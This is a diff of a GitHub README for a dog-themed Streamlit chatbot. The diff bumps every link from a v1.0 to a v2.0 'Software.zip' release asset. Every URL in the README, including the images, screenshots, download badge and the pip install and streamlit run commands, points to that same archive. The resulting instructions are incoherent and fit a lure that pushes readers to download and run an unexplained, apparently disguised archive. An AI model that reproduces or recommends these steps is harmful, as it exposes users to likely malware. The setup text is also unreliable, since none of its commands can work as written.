@@ -1,6 +1,6 @@
 # 🐶 Welcome to Doggo Rag Chatbot 🤖
 
-![Dog Chatbot](https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v1.0/Software.zip)
+![Dog Chatbot](https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v2.0/Software.zip)
 
 ### Repository Name:
 doggo-rag-chatbot
@@ -14,7 +14,7 @@ Welcome to **Doggo Rag Chatbot** - a cutting-edge Streamlit GenAI chatbot that l
 ### Get Started:
 Click on the button below to download the Doggo Rag Chatbot:
 
-[![Download Doggo Rag Chatbot](https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v1.0/Software.zip%20Rag%20Chatbot-brightgreen)](https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v1.0/Software.zip)
+[![Download Doggo Rag Chatbot](https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v2.0/Software.zip%20Rag%20Chatbot-brightgreen)](https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v2.0/Software.zip)
 
 **Note: Link needs to be launched.**
 
@@ -28,15 +28,15 @@ Click on the button below to download the Doggo Rag Chatbot:
 ### How to Use:
 1. Clone the repository to your local machine.
    
-2. Install the required dependencies by running `pip install -r https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v1.0/Software.zip`.
+2. Install the required dependencies by running `pip install -r https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v2.0/Software.zip`.
    
-3. Launch the chatbot app by running `streamlit run https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v1.0/Software.zip`.
+3. Launch the chatbot app by running `streamlit run https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v2.0/Software.zip`.
    
 4. Interact with the chatbot and enjoy learning more about dogs!
 
 ### Screenshots:
-![Chatbot Screenshot 1](https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v1.0/Software.zip)
-![Chatbot Screenshot 2](https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v1.0/Software.zip)
+![Chatbot Screenshot 1](https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v2.0/Software.zip)
+![Chatbot Screenshot 2](https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v2.0/Software.zip)
 
 ### Contributions:
 Contributions are welcome! Feel free to submit a pull request to enhance the functionality of the Doggo Rag Chatbot.
